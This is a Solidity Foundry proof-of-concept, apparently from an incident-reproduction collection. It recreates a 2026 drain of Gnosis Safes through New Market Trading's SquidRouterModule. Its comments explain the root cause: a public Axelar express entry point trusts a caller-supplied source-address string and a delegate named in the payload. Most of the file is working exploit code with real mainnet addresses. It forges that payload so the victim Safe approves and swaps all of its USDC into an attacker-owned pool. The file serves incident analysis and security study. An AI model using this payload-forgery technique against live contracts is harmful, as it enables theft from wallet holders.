// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$3.98M USD across 88 Gnosis Safes on Ethereum / Base / Arbitrum
//                         (this PoC drains one Ethereum victim Safe: ~5,806 USDC)
// Attacker      : 0x7c82cB4b2909C50C7c0F2B696Eee7565e0a23BB8 (main operator)
//                 0x9BDC730183821b6bb2B51BE30B77C964FA645b91 (co-operator, sent this tx)
// Attack Contract : 0xe1d5FCfBba4d46F4937de369De415dD7E2D3265a (Ethereum wrapper)
// Vulnerable Contract : 0x1f1d37a3Bf840e35c6a860c7C2dA71Fe555123ca (New Market Trading "SquidRouterModule" Safe module)
// Victim Safe   : 0xa081B9F72d586624F2eaA1eaCf53C1A268810e4E
// Attack Tx     : 0x59d17fd31e31959b2d562508bf91c4fc1271682ba7d61a6209865e1151b69aea
// @Analysis
// Attack date: May 25, 2026  Chain: Ethereum  Block: 25170513
// rekt.news: https://rekt.news/newmarkettrading-rekt
// Verified source (same address, Base): https://base.blockscout.com/address/0x1f1d37a3Bf840e35c6a860c7C2dA71Fe555123ca?tab=contract
//
// Run (Cancun EVM is required -- the Uniswap UniversalRouter uses EIP-1153 transient storage;
//      the repo default evm_version is 'shanghai'):
//   FOUNDRY_EVM_VERSION=cancun forge test --contracts src/test/2026-05/NewMarketTrading_exp.sol \
//       --match-contract NewMarketTradingExploit -vv
//
// Root Cause:
// The SquidRouterModule is a Gnosis Safe module that lets a whitelisted Squid/Axelar bridge message run
// swap/approve actions on a Safe. It inherits Axelar's AxelarExpressExecutableWithToken, which exposes:
//
//   function expressExecuteWithToken(bytes32 commandId, string sourceChain, string sourceAddress,
//                                    bytes payload, string symbol, uint256 amount) external payable {
//       ...
//       IERC20(gatewayToken).safeTransferFrom(msg.sender, address(this), amount); // relayer fronts `amount`
//       _executeWithToken(commandId, sourceChain, sourceAddress, payload, symbol, amount);
//   }
//
// This is the Axelar "express" fast path: ANYONE may call it. A relayer is supposed to front `amount`
// tokens and be reimbursed later when the real cross-chain message clears gateway.validateContractCallAndMint().
// The express path therefore performs NO gateway/cryptographic validation of the message.
//
// The module's override trusts caller-supplied data instead of the actual caller:
//
//   function _executeWithToken(..., string sourceAddress, bytes payload, string tokenSymbol, uint256 amount) {
//       address srcAddress = Strings.parseAddress(sourceAddress);
//       require(srcAddress == squidRouter, InvalidSourceAddress(srcAddress)); // <- compares a STRING the caller passed
//       _processPayload(IERC20(_getTokenAddress(tokenSymbol)), amount, payload);
//   }
//   function _processPayload(IERC20 bridgedToken, uint256 amount, bytes payload) {
//       (address module, address safe, address delegate, ActionsExecutionParams params)
//           = abi.decode(payload, (address, address, address, ActionsExecutionParams)); // <- delegate & safe from payload
//       require(module == address(this), ...);
//       bridgedToken.safeTransfer(safe, amount);
//       _handleActions(safe, delegate, params); // checks delegate's permission, never msg.sender == delegate
//   }
//
// Missing check: require(msg.sender == delegate)  (and/or genuine Axelar gateway validation on this path).
//
// Exploit (NO flash loan, NO funds fronted):
//   1. Call expressExecuteWithToken with amount = 0  -> safeTransferFrom(attacker, module, 0) costs nothing.
//   2. sourceAddress = the public squidRouter address string -> passes the require.
//   3. payload carries: module = the module, safe = victim Safe, delegate = a REAL public NMT delegate
//      (0x0f7aAa84...) that already holds APPROVE+SWAP permission on the Safe, and 3 actions:
//        a. ERC20_APPROVE   (USDC -> Permit2)
//        b. PERMIT2_APPROVE (USDC -> UniversalRouter)
//        c. UNI_V3_SWAP_EXACT_IN  USDC -> worthless "u" token, amountOutMin = 0
//   The module drives the Safe to swap its entire USDC into the attacker-owned Uniswap V3 pool.
//
// Function selectors:
// 0x_express... : expressExecuteWithToken(bytes32,string,string,bytes,string,uint256) -- public Axelar express entry

interface ISquidRouterModule {
    enum ExecuteActionType {
        UNI_V2_SWAP_EXACT_IN, // 0
        UNI_V2_SWAP_EXACT_OUT, // 1
        UNI_V3_SWAP_EXACT_IN, // 2
        UNI_V3_SWAP_EXACT_OUT, // 3
        ERC20_APPROVE, // 4
        PERMIT2_APPROVE, // 5
        NATIVE_WRAP, // 6
        NATIVE_UNWRAP // 7
    }

    struct ExecuteAction {
        ExecuteActionType actionType;
        bytes encodedData;
    }

    struct ActionsExecutionParams {
        ExecuteAction[] actions;
        bool isStrict;
    }

    function squidRouter() external view returns (address);
    function permit2() external view returns (address);
    function isUniversalRouter(
        address router
    ) external view returns (bool);

    function expressExecuteWithToken(
        bytes32 commandId,
        string calldata sourceChain,
        string calldata sourceAddress,
        bytes calldata payload,
        string calldata symbol,
        uint256 amount
    ) external payable;
}

contract NewMarketTradingExploit is Test {
    ISquidRouterModule constant MODULE = ISquidRouterModule(0x1f1d37a3Bf840e35c6a860c7C2dA71Fe555123ca);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant FAKE_U = IERC20(0xe6Ff0FE017D09D690493deC0F0f55E8f9Cdc3512); // worthless "u" token

    address constant VICTIM_SAFE = 0xa081B9F72d586624F2eaA1eaCf53C1A268810e4E;
    // A REAL, public NMT delegate that already holds APPROVE + SWAP permission on the Safe.
    address constant REAL_DELEGATE = 0x0f7aAa8457aD4c54093039CECf6036fB28bcBeF0;
    // Squid/Axelar router whose address-string the require() compares against (immutable on the module).
    address constant SQUID_ROUTER = 0xce16F69375520ab01377ce7B88f5BA8C48F8D666;
    string constant SQUID_ROUTER_STR = "0xce16F69375520ab01377ce7B88f5BA8C48F8D666";
    // Universal Router whitelisted in the module; routes the Safe's USDC into the attacker pool.
    address constant UNIVERSAL_ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    uint24 constant POOL_FEE = 500; // 0x0001f4, USDC/u pool fee tier

    uint256 constant ATTACK_BLOCK = 25_170_513;

    // The vulnerable module performs NO caller check, so ANY address can drive this drain. We prank as the
    // real attacker EOA (this tx's actual tx.origin) only because the attacker's OWN sink token ("u") has an
    // "only me" tx.origin guard that protects their poisoned pool from third parties -- that guard lives in the
    // attacker's token, NOT in the SquidRouterModule.
    address constant ATTACKER = 0x9BDC730183821b6bb2B51BE30B77C964FA645b91;

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK - 1);
        vm.label(address(MODULE), "SquidRouterModule");
        vm.label(address(USDC), "USDC");
        vm.label(address(FAKE_U), "FAKE_u_token");
        vm.label(VICTIM_SAFE, "VictimSafe");
        vm.label(REAL_DELEGATE, "RealDelegate");
        vm.label(UNIVERSAL_ROUTER, "UniversalRouter");
        vm.label(ATTACKER, "Attacker");
    }

    function testExploit() public {
        console.log("--- New Market Trading SquidRouterModule: payload-forgery Safe drain ---");
        console.log("Attack date: May 25, 2026  Chain: Ethereum  Block: %s", ATTACK_BLOCK);

        // Sanity: the require() target is just the public router address compared as a string.
        require(MODULE.squidRouter() == SQUID_ROUTER, "squidRouter mismatch");
        require(MODULE.isUniversalRouter(UNIVERSAL_ROUTER), "router not whitelisted");

        uint256 safeUsdcBefore = USDC.balanceOf(VICTIM_SAFE);
        console.log("\nVictim Safe USDC before :", safeUsdcBefore / 1e6, "USDC");
        console.log("Safe 'u' token before   :", FAKE_U.balanceOf(VICTIM_SAFE));
        require(safeUsdcBefore > 0, "safe has no USDC at fork block");

        // Swap the Safe's ENTIRE USDC balance, amountOutMin = 0 (attacker controls the pool).
        uint256 amountIn = safeUsdcBefore;
        bytes memory swapPath = abi.encodePacked(address(USDC), POOL_FEE, address(FAKE_U));

        // Build the 3 actions the module will run against the Safe.
        ISquidRouterModule.ExecuteAction[] memory actions = new ISquidRouterModule.ExecuteAction[](3);

        // (a) ERC20_APPROVE: Safe approves Permit2 to move its USDC.
        actions[0] = ISquidRouterModule.ExecuteAction({
            actionType: ISquidRouterModule.ExecuteActionType.ERC20_APPROVE,
            encodedData: abi.encode(address(USDC), MODULE.permit2(), type(uint256).max)
        });
        // (b) PERMIT2_APPROVE: Safe authorizes the Universal Router via Permit2.
        actions[1] = ISquidRouterModule.ExecuteAction({
            actionType: ISquidRouterModule.ExecuteActionType.PERMIT2_APPROVE,
            encodedData: abi.encode(address(USDC), UNIVERSAL_ROUTER, type(uint160).max)
        });
        // (c) UNI_V3_SWAP_EXACT_IN: dump the Safe's USDC into the attacker-owned pool for worthless "u".
        actions[2] = ISquidRouterModule.ExecuteAction({
            actionType: ISquidRouterModule.ExecuteActionType.UNI_V3_SWAP_EXACT_IN,
            encodedData: abi.encode(UNIVERSAL_ROUTER, amountIn, uint256(0), block.timestamp + 600, swapPath)
        });

        ISquidRouterModule.ActionsExecutionParams memory params =
            ISquidRouterModule.ActionsExecutionParams({actions: actions, isStrict: true});

        // payload = abi.encode(module, safe, delegate, params) -- exactly what _processPayload decodes.
        bytes memory payload = abi.encode(address(MODULE), VICTIM_SAFE, REAL_DELEGATE, params);

        // The attacker fronts ZERO tokens: symbol "WETH", amount 0 -> safeTransferFrom(attacker, module, 0).
        // prank sets both msg.sender and tx.origin to the attacker EOA (the latter satisfies the attacker's
        // own sink-token guard; the module itself never inspects either).
        vm.prank(ATTACKER, ATTACKER);
        MODULE.expressExecuteWithToken(
            keccak256("nmt-poc-commandId"), // any unused commandId (isCommandExecuted == false)
            "", // sourceChain (ignored)
            SQUID_ROUTER_STR, // caller-supplied "source address" string -> passes the require
            payload,
            "WETH", // bridged token symbol (amount 0, irrelevant)
            0
        );

        uint256 safeUsdcAfter = USDC.balanceOf(VICTIM_SAFE);
        console.log("\n=== After expressExecuteWithToken (no funds fronted, no gateway message) ===");
        console.log("Victim Safe USDC after  :", safeUsdcAfter / 1e6, "USDC");
        console.log("Safe 'u' token after    :", FAKE_U.balanceOf(VICTIM_SAFE));
        console.log("USDC drained out of Safe:", (safeUsdcBefore - safeUsdcAfter) / 1e6, "USDC");

        // The Safe's USDC is gone; it received only worthless "u" tokens.
        assertEq(safeUsdcAfter, 0, "Safe USDC was not fully drained");
        assertGt(FAKE_U.balanceOf(VICTIM_SAFE), 0, "Safe did not receive worthless token");

        console.log(
            "\nPayload-forgery confirmed: an unauthorized caller drained the Safe's USDC with no funds fronted."
        );
    }
}
